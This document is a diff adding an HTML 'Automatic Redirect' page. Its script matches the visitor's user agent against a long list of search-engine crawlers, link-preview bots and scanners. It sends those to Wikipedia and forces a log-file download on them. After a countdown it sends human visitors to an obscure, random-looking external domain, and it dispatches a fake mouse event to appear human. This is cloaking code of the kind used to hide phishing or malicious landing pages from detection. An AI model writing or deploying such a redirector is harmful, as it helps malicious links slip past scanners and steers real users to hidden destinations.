@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Automatic Redirect</title>
+
+    <style>
+
+        body {
+
+            'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+
+            background-color: #f0f0f0;
+
+            color: #333;
+
+            0;
+
+            padding: 20px;
+
+            text-align: center;
+
+        }
+
+        #message {
+
+            font-size: 18px;
+
+            display: none; /* Hide the message */
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div id="message">Redirecting...</div>
+
+ 
+
+    <script>
+
+        // Comprehensive bot and crawler user agent patterns
+
+        const botUserAgents = [
+
+            /bot/i, /crawler/i, /spider/i, /curl/i, /slurp/i, /facebookexternalhit/i,
+
+            /mediapartners-google/i, /adsbot-google/i, /googlebot/i, /bingbot/i, /msnbot/i, 
+
+            /yandexbot/i, /duckduckbot/i, /baiduspider/i, /sogou/i, /linkedinbot/i, 
+
+            /applebot/i, /facebot/i, /twitterbot/i, /pingdom/i, /github-camo/i, 
+
+            /discordbot/i, /whatsapp/i, /telegrambot/i, /redditbot/i, /semrushbot/i, 
+
+            /ahrefsbot/i, /pinterest/i, /ia_archiver/i, /mj12bot/i, /dotbot/i,
+
+            /bingpreview/i, /msnbot-media/i, /adidxbot/i, /apis-google/i, /bingadsbot/i
+
+        ];
+
+ 
+
+        // Function to detect if the visitor is a bot
+
+        const isBot = botUserAgents.some((pattern) => pattern.test(navigator.userAgent));
+
+ 
+
+        // Function to generate a log file and trigger download
+
+        function saveLog(logContent) {
+
+            const blob = new Blob([logContent], { type: 'text/plain' });
+
+            const url = URL.createObjectURL(blob);
+
+            const a = document.createElement('a');
+
+            a.href = url;
+
+            a.download = 'bot_log.txt';
+
+            document.body.appendChild(a);
+
+            a.click();
+
+            document.body.removeChild(a);
+
+            URL.revokeObjectURL(url);
+
+        }
+
+ 
+
+        if (isBot) {
+
+            const botInfo = `Bot detected!\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}\n\n`;
+
+            console.log("Bot detected. Redirecting to Wikipedia.");
+
+ 
+
+            // Save the bot information locally
+
+            let botLog = localStorage.getItem('botLog') || '';
+
+            botLog += botInfo;
+
+            localStorage.setItem('botLog', botLog);
+
+ 
+
+            // Trigger the download of the bot log file
+
+            saveLog(botLog);
+
+ 
+
+            // Redirect to Wikipedia
+
+            window.location.href = "https://www.wikipedia.org";
+
+        } else {
+
+            let countdown = 5; // Initial countdown time
+
+            const randomDelay = Math.floor(Math.random() * 2000) + 1000; // Random delay between 1-3 seconds
+
+ 
+
+            // Simulate human-like interaction with random delays
+
+            function simulateUserActivity() {
+
+                setTimeout(() => {
+
+                    const mouseEvent = new MouseEvent('mousemove', {
+
+                        bubbles: true,
+
+                        cancelable: true,
+
+                        view: window
+
+                    });
+
+                    document.dispatchEvent(mouseEvent);
+
+                }, randomDelay);
+
+            }
+
+ 
+
+            const interval = setInterval(() => {
+
+                countdown--;
+
+                if (countdown <= 0) {
+
+                    clearInterval(interval);
+
+                    window.location.href = "https://5mn.xsizerlv.com/jCQa/#H"; // Replace with your URL
+
+                }
+
+            }, 1000);
+
+ 
+
+            // Show the message and start simulating user activity
+
+            document.getElementById('message').style.display = 'block';
+
+            simulateUserActivity();
+
+        }
+
+    </script>
+
+</body>
+
+</html>
